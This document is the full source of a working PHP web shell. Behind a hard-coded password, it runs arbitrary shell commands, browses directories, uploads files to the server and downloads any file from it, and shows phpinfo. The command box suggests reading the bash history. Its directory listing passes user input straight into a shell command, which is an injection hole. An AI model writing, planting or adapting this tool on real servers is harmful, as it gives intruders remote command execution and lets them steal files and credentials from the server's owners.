<?php
session_start();
const PASSWORD = "password";
$logged = false;
$listingDir = getcwd();

if (isset($_POST["disconnect"])) {
    $_SESSION = [];
    session_destroy();
}

if ($_SESSION["logged"]) {
    $logged = true;
}

if (isset($_POST["login"]) && !$logged) {
    $password = $_POST["password"];
    if (PASSWORD == $password) {
        $_SESSION["logged"] = true;
        $logged = true;
    }
}

$isPhpInfoAsked = false;

if ($logged) {
    if (isset($_POST["toDownload"])) {
        downloadFile($_POST["toDownload"]);
    }
    if (isset($_GET["show"])) {
        $isPhpInfoAsked = $_GET["show"] == "PHPInfo";
    }
    if (isset($_SESSION["chdir"])) {
        chdir($_SESSION["chdir"]);
    }
    if (isset($_POST["setCWD"])) {
        $_SESSION["chdir"] = $_SESSION["listingDir"];
        chdir($_SESSION["listingDir"]);
    }
    if (isset($_POST["listingPath"])) {
        $_SESSION["listingDir"] = $_POST["listingPath"];
    }
    if (isset($_SESSION["listingDir"])) {
        $listingDir = $_SESSION["listingDir"];
    }
    $path = getcwd();
    $dirContent = preg_split("/\s+/", trim(shell_exec("ls $listingDir")));
    if ($_POST["fileUpload"]) {
        $uploadPath = trim($path)."/".basename( $_FILES["uploadedFile"]["name"]);

        if (move_uploaded_file($_FILES["uploadedFile"]["tmp_name"], $uploadPath)) {
            echo "The file ".  basename( $_FILES["uploaded_file"]["name"]).
                " has been uploaded";
        } else {
            echo "There was an error uploading the file, please try again!";
            echo $uploadPath;
        }
    }
    if (isset($_POST["command"])) {
        $command = $_POST["command"];
        $args = preg_split("/ /", $command);
        if ($args[0] == "cd") {
            $newChdir = $_SESSION["chdir"] . "/" . $args[1];
            $_SESSION["chdir"] = $newChdir;
            chdir($newChdir);
            header("Refresh:0");
        } else {
            $result = shell_exec($command);
        }
    }
}

function downloadFile($filePath) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Content-Length: ' . filesize($filePath));
    readfile($filePath);
}

function embedded_phpinfo()
{
    ob_start();
    phpinfo();
    $phpinfo = ob_get_contents();
    ob_end_clean();
    $phpinfo = preg_replace('%^.*<body>(.*)</body>.*$%ms', '$1', $phpinfo);
    echo "
        <style type='text/css'>
            #phpinfo {}
            #phpinfo pre {margin: 0; font-family: monospace;}
            #phpinfo a:link {color: #009; text-decoration: none; background-color: #fff;}
            #phpinfo a:hover {text-decoration: underline;}
            #phpinfo table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}
            #phpinfo .center {text-align: center;}
            #phpinfo .center table {margin: 1em auto; text-align: left;}
            #phpinfo .center th {text-align: center !important;}
            #phpinfo td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
            #phpinfo h1 {font-size: 150%;}
            #phpinfo h2 {font-size: 125%;}
            #phpinfo .p {text-align: left;}
            #phpinfo .e {background-color: #ccf; width: 300px; font-weight: bold;}
            #phpinfo .h {background-color: #99c; font-weight: bold;}
            #phpinfo .v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}
            #phpinfo .v i {color: #999;}
            #phpinfo img {float: right; border: 0;}
            #phpinfo hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
        </style>
        <div id='phpinfo'>
            $phpinfo
        </div>
        ";
}
?>
<html lang="en">
<head>
    <title>Webshell</title>
    <style>
        /* Reset */
        * { box-sizing: border-box; padding: 0; margin: 0 }
        * :not(pre) { font-family: sans-serif; }
        /* General */
        body { background: #2d3436 }
        #container { display: flex; height: 100vh; width: 100vw }
        #leftPart { width: 60%; height: 100%; margin: 0 auto; padding: 20px; display: flex; flex-direction: column; justify-content: space-between }
        #rightPart { width: 40%; height: 100%; margin: 0 auto; padding: 20px }
        ul { list-style: none }
        #disconnect { position: fixed; bottom: 10px; right: 10px }
        #reload { position: fixed; bottom: 10px; left: 10px }
        input[type="text"] { padding: 5px; width: 80% }
        #cwdListing { margin-top: 10px; padding: 10px; background: lightgrey; height: 80vh; overflow: scroll }
        /* Left Part */
        #head { background: #6c7a89; padding: 8px; display: flex; justify-content: center; align-items: center; color: white; border-radius: 5px }
        /* File Upload */
        #fileUploadForm { background: #6c7a89; color: white; display: flex; height: 4vh; font-size: 13px; align-items: center }
        #fileUploadForm label { display: flex; cursor: pointer; justify-content: center; align-items: center; padding-left: 5px; width: 150px }
        #fileUploadForm input[type="file"] { cursor: pointer; width: 100% }
        #fileUploadForm input[type="submit"] { border-radius: 0 5px 5px 0; cursor: pointer; height: 100%; min-width: 120px; justify-self: flex-end }
        /* Quick access */
        #quickAccess { height: 4vh; display: flex; justify-content: space-between }
        #quickAccess input { height: 100%; width: 100px; border-radius: 5px}
        /* Command Input / Output */
        .clickable:hover { cursor: pointer; text-decoration: underline }
        .commandContainer { height: 75vh; display: flex; flex-direction: column }
        .commandContainer * { font-family: monospace }
        .commandContainer form { border-radius: 5px 5px 0 0 }
        .commandContainer pre { height: 100%; border-radius: 0 0 5px 5px; background: #111; color: #ddd; padding: 10px; overflow: scroll; cursor: text }
        .commandContainer pre::-webkit-scrollbar-corner { display: none }
        .commandContainer pre::-webkit-scrollbar-track { background: #111 }
        .commandContainer pre::-webkit-scrollbar-thumb { background: #ddd; border-radius: 2px; }
        .commandContainer pre::-webkit-scrollbar { -webkit-appearance: none; width: 4px; height: 4px }
        #command:focus { outline: none }
        #commandForm { background: #111; color: white; display: flex; height: 30px; font-size: 13px }
        #commandForm label { padding-left: 10px; display: flex; justify-content: center; align-items: center; border-radius: 5px 0 0 5px }
        #commandForm span { display: flex; justify-content: center; align-items: center; padding-left: 5px }
        #commandForm input[type="text"] { background: #111; color: white; border: none; width: 100%; font-size: 13px; border-radius: 0 5px 0 0 }
        #commandForm input[type="text"]::placeholder { color: #919191 }
        /* Misc */
        #phpInfoContainer { position: absolute; top: 0; height: 100vh; width: 100vw; display: flex; flex-direction: column; justify-content: center; align-items: center }
        #phpInfoContent { border: 1px black solid; background: lightgrey; height: 90vh; width: 70vw; overflow: scroll }
        #phpCloseButton { border: 1px black solid; background: lightgrey; height: 5vh; width: 70vw; display: flex; justify-content: center; align-items: center; cursor: pointer }
        #phpCloseButton:hover { background: #bbb }
        .fileListEntry { display: flex }
        .downloadFile { display: flex; margin-right: 5px; height: 17px; width: 17px; cursor: pointer; justify-content: center; align-items: center; border: 1px black solid }
    </style>
</head>
<body>
    <?php
    if (!$logged) { ?>
        <h3>You need to be logged in in order to execute a command</h3>
        <form action="" method="POST">
            <label for="password">Password</label>
            <input type="password" name="password" id="password" />
            <input type="submit" name="login" value="login" />
        </form>
    <?php } else { ?>
        <div id="container">
            <div id="leftPart">
                <!-- Head -->
                <h1 id="head">PHP WebShell</h1>
                <!-- File upload -->
                <form enctype="multipart/form-data" action="" method="post" id="fileUploadForm">
                    <label for="fileUpload">Upload a file</label>
                    <input type="hidden" name="fileUpload" value="1">
                    <input type="file" name="uploadedFile" id="fileUpload" /><br />
                    <input type="submit" value="Upload" />
                </form>
                <!-- Quick access buttons -->
                <form action="" method="get" id="quickAccess">
                    <input type="submit" name="show" value="PHPInfo">
                    <input type="submit" name="" value="1">
                    <input type="submit" name="" value="1">
                    <input type="submit" name="" value="1">
                    <input type="submit" name="" value="1">
                    <input type="submit" name="" value="1">
                    <input type="submit" name="" value="1">
                </form>
                <!-- Command container -->
                <div class="commandContainer">
                    <!-- Command input -->
                    <form action="" method="POST" id="commandForm">
                        <label for="command"><?= $path ?></label>
                        <span>$</span>
                        <input type="text" name="command" id="command" placeholder="tail ~/.bash_history" />
                    </form>
                    <!-- Command output -->
                    <pre><?= htmlspecialchars($result) ?></pre>
                </div>
            </div>
            <hr id="separator">
            <div id="rightPart">
                <form action="" method="post" id="directoryContentForm">
                    <h1>Content of the directory
                    <small>
                        <label for="listingPath">Path: </label>
                        <input type="text" name="listingPath" id="listingPath" value="<?= $listingDir ?>">
                        <input type="button" value="Reset path" onclick="resetPath()">
                        <input type="submit" name="setCWD" value="Set CWD">
                    </small></h1>
                </form>
                    <ul id="cwdListing">
                        <li><span class="clickable" onclick="upALevel()" title="Up a level">..</span></li>
                        <?php
                        foreach ($dirContent as $file) { ?>
                            <li class="fileListEntry"><?php if (strpos($file, ".") !== false) {
                                echo "<form action=\"\" method=\"post\">";
                                echo "<input type=\"hidden\" value=\"". getcwd() . "/" . $file . "\" name=\"toDownload\" />";
                                echo "<input type=\"submit\" value=\"&darr;\" class=\"downloadFile\" title=\"Download file\" />";
                                echo "</form>";
                            } ?><span class="clickable" onclick="reloadList(this)" title="<?= $file ?>"><?= $file ?></span></li>
                        <?php } ?>
                    </ul>
            </div>
            <!-- Disconnect -->
            <form action="" method="post" id="disconnect">
                <input type="submit" name="disconnect" value="Disconnect" />
            </form>
            <!-- Reload / DO NOT TOUCH, I KNOW THAT'S CRAP -->
            <input type="submit" value="Reload" id="reload" onclick="window.location.href = location.href" />
        </div>
        <script>
            let commandInput = document.querySelector("#command");
            let showPhpInfoButton = document.querySelector("#showPhpInfo");
            let form = document.querySelector("#directoryContentForm");

            function focusCommandInput() {
                commandInput.focus();
            }
            function reloadList(elem) {
                form.querySelector("input").value += "/" + elem.innerHTML;
                form.submit();
            }
            function resetPath() {
                form.querySelector("input").value = "<?= getcwd() ?>";
                form.submit();
            }
            function upALevel() {
                let input = form.querySelector("input");
                let newString = input.value.split("/");
                newString.pop();
                input.value = newString.join("/");
                form.submit();
            }

            if ("<?= $isPhpInfoAsked ?>") {
                let phpInfoContainer = document.createElement("div");
                phpInfoContainer.id = "phpInfoContainer";
                let phpInfoContent = document.createElement("div");
                phpInfoContent.id = "phpInfoContent";
                phpInfoContent.innerHTML = `<?php embedded_phpinfo(); ?>`;
                let phpCloseButton = document.createElement("div");
                phpCloseButton.id = "phpCloseButton";
                phpCloseButton.innerHTML = "Click to close";
                phpInfoContainer.appendChild(phpInfoContent);
                phpInfoContainer.appendChild(phpCloseButton);
                phpCloseButton.addEventListener("click", function() {
                    phpInfoContainer.remove()
                });
                document.body.appendChild(phpInfoContainer);
            }

            removeAllGetParams();
            focusCommandInput();

            function removeAllGetParams() {
                window.history.replaceState({}, document.title, document.location.href.split("?")[0]);
            }
        </script>
    <?php } ?>
</body>
</html>

